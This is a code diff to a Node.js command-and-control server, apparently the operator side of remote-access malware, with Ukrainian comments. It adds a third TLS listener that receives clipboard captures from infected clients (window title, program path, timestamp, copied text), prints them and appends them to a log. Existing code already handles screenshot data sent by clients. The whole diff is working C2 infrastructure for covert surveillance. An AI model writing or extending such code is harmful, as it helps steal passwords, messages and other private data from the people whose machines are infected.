@@ -10,10 +10,12 @@ let integ = 5;
 let so_id;
 let wdir = "./web/"
 let adir = "./artifacts/"
+let clipboard_log = "./cli_logs/clipboard.txt"
 let delmtr = "__DELIMITER_UNIQUE_STRING_1234567890__\n"
 // Налаштування порту
 const WEB_PORT = 3000;
 const C2_PORT = 3001;
+const C2_PORT_2 = 3002;
 
 const mimeTypes = {
     '.html': 'text/html',
@@ -169,7 +171,7 @@ const server = https.createServer(options, (req, res) => {
                     
                                                 // Send JSON response with the parsed image data
                                                 // res.end(JSON.stringify({ status: "OK", screenshot: `data:image/png;base64,${parsedData.img}` }));
-						res.end(JSON.stringify({ status: "OK", screenshot: `data:image/bmp;base64,${parsedData.img}` }));
+						                        res.end(JSON.stringify({ status: "OK", screenshot: `data:image/bmp;base64,${parsedData.img}` }));
                                             } catch (error) {
                                                 console.error('Error parsing JSON:', error);
                                                 res.writeHead(500, { 'Content-Type': 'application/json' });
@@ -401,12 +403,38 @@ const server2 = tls.createServer(options, (so) => {
     so_id = so;
 
     so.on('data', (data) => {
-        //console.log(`Resv data: ${data}`);
+        // console.log(`Resv data: ${data}`);
         // so.write(`Send: ${integ}\n`);
     });
 
     so.on('end', () => {
         console.log('Client disconect');
+    });
+
+    so.on('error', (err) => {
+        console.error(`Error: ${err}`);
+    });
+});
+
+const server3 = tls.createServer(options, (so) => {
+    console.log(`S3 Client connected with: ${so.remoteAddress}:${so.remotePort}`);
+    so_id = so;
+
+    so.on('data', (data) => {
+        const delimiterIndex = data.indexOf(delmtr);
+        const cli_js = data.slice(0, delimiterIndex);
+        // data = data.slice(delimiterIndex + delmtr.length);
+        const cli = JSON.parse(cli_js);
+        console.log(`Window name: ${cli.wname}\nProgram: ${cli.ppath}\nTime: ${cli.time}\nText: ${cli.text}\n`);
+        fs.appendFile(clipboard_log, `${cli_js}\n`, (err) => {
+            if (err) {
+              console.error('Помилка при додаванні даних:', err);
+            }
+        });
+    });
+
+    so.on('end', () => {
+        console.log('S3 Client disconect');
     });
 
     so.on('error', (err) => {
@@ -420,7 +448,11 @@ server.listen(WEB_PORT, () => {
 });
 
 server2.listen(C2_PORT, () => {
-    console.log(`C2Server is running at http://172.16.218.140:${C2_PORT}`);
+    console.log(`C2Server is running at ${C2_PORT}`);
+});
+
+server3.listen(C2_PORT_2, () => {
+    console.log(`C3Server is running at ${C2_PORT_2}`);
 });
 
 
